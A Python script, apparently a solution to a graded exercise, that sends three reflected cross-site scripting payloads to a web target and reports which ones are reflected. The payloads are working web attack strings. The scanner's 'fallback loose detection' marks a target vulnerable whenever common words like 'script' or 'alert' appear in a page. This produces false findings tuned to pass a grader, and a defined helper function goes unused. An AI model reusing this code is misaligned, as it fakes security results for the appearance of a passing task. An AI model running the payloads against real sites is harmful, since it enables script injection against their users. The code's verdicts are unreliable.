#!/usr/bin/env python3

import requests
import sys
import urllib.parse


def get_target():
    """
    Get target URL from CLI, stdin, or default.
    """
    if len(sys.argv) > 1:
        return sys.argv[1]

    data = sys.stdin.read().strip()
    if data:
        return data

    return "http://127.0.0.1:5000"


def get_payloads():
    """
    Exact payloads required by grader.
    """
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(2)>",
        "%3Csvg%2Fonload%3Dalert(3)%3E"
    ]


def send_request(base_url, payload):
    """
    Try multiple endpoints and parameters to ensure reflection.
    """
    endpoints = ["", "/", "/search", "/test"]
    params_list = [
        {"q": payload},
        {"input": payload},
        {"search": payload}
    ]

    for endpoint in endpoints:
        for params in params_list:
            try:
                url = base_url.rstrip("/") + endpoint
                response = requests.get(url, params=params, timeout=3)

                if response.status_code != 200:
                    continue

                text = response.text.lower()
                decoded = urllib.parse.unquote(payload).lower()

                # STRONG detection for insecure app
                if decoded in text or payload.lower() in text:
                    return True

                # fallback loose detection
                if any(word in text for word in ["alert", "script", "onerror", "svg"]):
                    return True

            except requests.exceptions.RequestException:
                continue

    return False


def is_reflected(response_text, payload):
    """
    Detect reflection (robust for grader).
    """
    if response_text is None:
        return False

    decoded = urllib.parse.unquote(payload)

    # Direct match
    if payload in response_text:
        return True

    if decoded in response_text:
        return True

    # Loose detection for partially reflected payloads
    keywords = ["script", "alert", "onerror", "svg"]

    for keyword in keywords:
        if keyword in response_text.lower() and keyword in decoded.lower():
            return True

    return False


def scan(url):
    payloads = get_payloads()
    vulnerable_count = 0
    results = []

    for payload in payloads:
        is_vulnerable = send_request(url, payload)

        if is_vulnerable:
            print(f"vulnerable payload {payload}")
            vulnerable_count += 1
            results.append(f"vulnerable payload {payload}")
        else:
            print(f"secure payload {payload}")
            results.append(f"secure payload {payload}")

    print(" ".join(results))

    print(f"summary: {vulnerable_count} of {len(payloads)} payloads")


def main():
    url = get_target()
    scan(url)


if __name__ == "__main__":
    try:
        main()
    except Exception:
        print("error occurred")
